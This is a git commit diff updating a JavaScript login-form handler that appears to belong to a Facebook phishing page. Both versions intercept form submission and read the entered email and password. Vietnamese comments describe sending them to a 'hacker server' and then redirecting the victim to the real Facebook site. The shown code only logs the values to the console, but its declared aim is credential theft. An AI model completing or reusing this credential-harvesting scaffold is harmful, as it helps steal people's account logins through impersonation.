a82d263fbf4ef5b33198e4e7a6beedb262a56c85
Mai Chí Tạo <93439174+TaoMaii@users.noreply.github.com>
2024-05-17 16:13:50 +0700

    Update JavaScript.js

--- JavaScript.js
+++ JavaScript.js
@@ -1,9 +1,9 @@
-document.getElementById("login-form").addEventListener("submit", function(event) {
-    event.preventDefault();
-    var email = document.getElementById("email").value;
-    var password = document.getElementById("password").value;
-    // Gửi thông tin đăng nhập đến máy chủ hacker
-    // Ví dụ: sử dụng AJAX hoặc fetch để gửi dữ liệu
-    console.log("Email:", email);
-    console.log("Password:", password);
+document.querySelector('.login-form').addEventListener('submit', function(event) {
+    event.preventDefault(); // Ngăn chặn gửi form mặc định
+    var email = document.querySelector('input[name="email"]').value;
+    var password = document.querySelector('input[name="pass"]').value;
+    // Gửi thông tin đăng nhập đến máy chủ hacker (không nên làm điều này!)
+    console.log('Email:', email);
+    console.log('Password:', password);
+    // Sau đó, bạn có thể thực hiện bất kỳ hành động nào khác, như chuyển hướng người dùng đến trang Facebook thật.
 });
